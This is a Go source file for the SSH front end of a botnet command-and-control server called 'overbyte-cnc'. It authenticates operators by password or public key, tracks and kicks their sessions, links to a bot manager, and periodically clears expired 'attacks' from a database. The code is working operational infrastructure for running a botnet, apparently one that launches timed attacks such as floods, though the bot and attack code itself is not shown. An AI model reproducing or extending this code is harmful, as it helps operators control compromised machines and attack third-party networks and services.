package cnc

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/binary"
	"encoding/pem"
	"fmt"
	"net"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"overbyte-cnc/bot"
	"overbyte-cnc/config"
	"overbyte-cnc/database"
	"overbyte-cnc/logger"
	"overbyte-cnc/ui"

	"golang.org/x/crypto/ssh"
)

type Server struct {
	listener     net.Listener
	sshConfig    *ssh.ServerConfig
	port         int
	hostKeyPath  string
	db           *database.Database
	botManager   *bot.Manager
	uiManager    *ui.UIManager
	cfg          *config.Config
	sessions     map[string]*Session
	sessionMutex sync.RWMutex
	sessionCount int32
	StartTime    time.Time
	stopCleanup  chan struct{}
}

func NewServer(port int, hostKeyPath string, db *database.Database, botManager *bot.Manager, uiManager *ui.UIManager, cfg *config.Config) *Server {
	return &Server{
		port:        port,
		hostKeyPath: hostKeyPath,
		db:          db,
		botManager:  botManager,
		uiManager:   uiManager,
		cfg:         cfg,
		sessions:    make(map[string]*Session),
		StartTime:   time.Now(),
		stopCleanup: make(chan struct{}),
	}
}

func (s *Server) Start() error {
	signer, err := s.loadOrGenerateHostKey()
	if err != nil {
		return fmt.Errorf("failed to load host key: %w", err)
	}

	s.sshConfig = &ssh.ServerConfig{
		PasswordCallback:  s.passwordCallback,
		PublicKeyCallback: s.publicKeyCallback,
		MaxAuthTries:      3,
		ServerVersion:     "SSH-2.0-ByteNet",
	}
	s.sshConfig.AddHostKey(signer)

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", s.port))
	if err != nil {
		return err
	}
	s.listener = listener

	logger.Info("SSH server listening on port %d", s.port)

	go s.acceptLoop()
	go s.attackCleanupLoop()

	return nil
}

func (s *Server) Stop() {
	if s.listener != nil {
		s.listener.Close()
	}
	close(s.stopCleanup)

	// Wait briefly for sessions to drain
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		s.sessionMutex.RLock()
		count := len(s.sessions)
		s.sessionMutex.RUnlock()
		if count == 0 {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func (s *Server) GetSessionCount() int {
	return int(atomic.LoadInt32(&s.sessionCount))
}

func (s *Server) loadOrGenerateHostKey() (ssh.Signer, error) {
	keyPath := s.hostKeyPath
	if keyPath == "" {
		keyPath = "ssh_host_key"
	}

	keyData, err := os.ReadFile(keyPath)
	if err == nil {
		signer, err := ssh.ParsePrivateKey(keyData)
		if err == nil {
			logger.Info("Loaded existing SSH host key from %s", keyPath)
			return signer, nil
		}
		logger.Warn("Failed to parse existing host key, regenerating...")
	}

	logger.Info("Generating new Ed25519 SSH host key...")
	pubKey, privateKey, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("failed to generate key: %w", err)
	}

	pemBlock, err := ssh.MarshalPrivateKey(privateKey, "")
	if err != nil {
		return nil, fmt.Errorf("failed to marshal private key: %w", err)
	}

	keyData = pem.EncodeToMemory(pemBlock)
	if err := os.WriteFile(keyPath, keyData, 0600); err != nil {
		logger.Warn("Failed to save host key: %v", err)
	} else {
		logger.Info("Saved new SSH host key to %s", keyPath)
	}

	sshPubKey, err := ssh.NewPublicKey(pubKey)
	if err == nil {
		pubKeyData := ssh.MarshalAuthorizedKey(sshPubKey)
		os.WriteFile(keyPath+".pub", pubKeyData, 0644)
	}

	signer, err := ssh.NewSignerFromKey(privateKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create signer: %w", err)
	}

	return signer, nil
}

func (s *Server) passwordCallback(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
	username := conn.User()

	user, err := s.db.AuthenticateUser(username, string(password))
	if err != nil {
		logger.Error("Auth failed for user %s: %v", username, err)
		return nil, fmt.Errorf("authentication failed: %v", err)
	}
	if user == nil {
		logger.Info("Auth failed for user %s: invalid credentials", username)
		return nil, fmt.Errorf("invalid username or password")
	}

	return &ssh.Permissions{
		Extensions: map[string]string{
			"user_id":   fmt.Sprintf("%d", user.ID),
			"username":  user.Username,
			"auth_type": "password",
		},
	}, nil
}

func (s *Server) publicKeyCallback(conn ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, error) {
	username := conn.User()

	user, err := s.db.GetUserDetails(username)
	if err != nil {
		return nil, fmt.Errorf("user not found")
	}

	allowedRoles := s.cfg.CNC.SSHPubkeyAuthRoles
	roleAllowed := false
	for _, role := range allowedRoles {
		if user.Role == role {
			roleAllowed = true
			break
		}
	}

	if !roleAllowed {
		return nil, fmt.Errorf("pubkey auth not allowed for role %s", user.Role)
	}

	if user.SSHPublicKey == "" {
		return nil, fmt.Errorf("no public key registered")
	}

	storedKey, _, _, _, err := ssh.ParseAuthorizedKey([]byte(user.SSHPublicKey))
	if err != nil {
		return nil, fmt.Errorf("invalid stored key")
	}

	if string(key.Marshal()) != string(storedKey.Marshal()) {
		return nil, fmt.Errorf("key mismatch")
	}

	return &ssh.Permissions{
		Extensions: map[string]string{
			"user_id":   fmt.Sprintf("%d", user.ID),
			"username":  user.Username,
			"auth_type": "publickey",
		},
	}, nil
}

func (s *Server) acceptLoop() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			return
		}

		if s.cfg.CNC.MaxSessions > 0 && int(atomic.LoadInt32(&s.sessionCount)) >= s.cfg.CNC.MaxSessions {
			conn.Close()
			continue
		}

		go s.handleConnection(conn)
	}
}

func (s *Server) handleConnection(nConn net.Conn) {
	atomic.AddInt32(&s.sessionCount, 1)
	defer atomic.AddInt32(&s.sessionCount, -1)
	defer nConn.Close()

	sshConn, chans, reqs, err := ssh.NewServerConn(nConn, s.sshConfig)
	if err != nil {
		logger.Debug("SSH handshake failed from %s: %v", nConn.RemoteAddr(), err)
		return
	}
	defer sshConn.Close()

	username := sshConn.Permissions.Extensions["username"]
	user, err := s.db.GetUserDetails(username)
	if err != nil {
		logger.Error("Failed to get user %s: %v", username, err)
		return
	}

	logger.LogLogin(user.Username, nConn.RemoteAddr().String(), true)

	go ssh.DiscardRequests(reqs)

	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			continue
		}

		session := NewSession(channel, user, s.db, s.botManager, s.uiManager, s.cfg, s)
		if session == nil {
			channel.Close()
			continue
		}
		go s.handleChannelRequests(requests, session)

		s.sessionMutex.Lock()
		s.sessions[nConn.RemoteAddr().String()] = session
		s.sessionMutex.Unlock()

		session.Run()

		s.sessionMutex.Lock()
		delete(s.sessions, nConn.RemoteAddr().String())
		s.sessionMutex.Unlock()

		channel.Close()
	}
}

func (s *Server) handleChannelRequests(requests <-chan *ssh.Request, session *Session) {
	for req := range requests {
		switch req.Type {
		case "pty-req":
			if len(req.Payload) >= 4 {
				termLen := binary.BigEndian.Uint32(req.Payload[:4])
				offset := 4 + int(termLen)
				if len(req.Payload) >= offset+8 {
					w := int(binary.BigEndian.Uint32(req.Payload[offset : offset+4]))
					h := int(binary.BigEndian.Uint32(req.Payload[offset+4 : offset+8]))
					if w > 0 && h > 0 {
						session.SetSize(w, h)
					}
				}
			}
			req.Reply(true, nil)
		case "shell":
			req.Reply(true, nil)
		case "window-change":
			if len(req.Payload) >= 8 {
				w := int(binary.BigEndian.Uint32(req.Payload[:4]))
				h := int(binary.BigEndian.Uint32(req.Payload[4:8]))
				if w > 0 && h > 0 {
					session.SetSize(w, h)
				}
			}
			req.Reply(true, nil)
		default:
			if req.WantReply {
				req.Reply(false, nil)
			}
		}
	}
}

type SessionInfo struct {
	Username  string
	RemoteIP  string
	Connected time.Time
}

func (s *Server) GetAllSessions() []SessionInfo {
	s.sessionMutex.RLock()
	defer s.sessionMutex.RUnlock()

	var sessions []SessionInfo
	for addr, session := range s.sessions {
		sessions = append(sessions, SessionInfo{
			Username:  session.user.Username,
			RemoteIP:  addr,
			Connected: session.connectedAt,
		})
	}
	return sessions
}

func (s *Server) KickUserByUsername(username string) int {
	s.sessionMutex.RLock()
	var toKick []*Session
	for _, session := range s.sessions {
		if session.user.Username == username {
			toKick = append(toKick, session)
		}
	}
	s.sessionMutex.RUnlock()

	for _, session := range toKick {
		session.Close()
	}

	return len(toKick)
}

func (s *Server) GetUptime() time.Duration {
	return time.Since(s.StartTime)
}

func (s *Server) attackCleanupLoop() {
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-s.stopCleanup:
			return
		case <-ticker.C:
			count, err := s.db.CleanupExpiredAttacks()
			if err != nil {
				logger.Error("Failed to cleanup expired attacks: %v", err)
			} else if count > 0 {
				logger.Debug("Cleaned up %d expired attacks", count)
			}
		}
	}
}


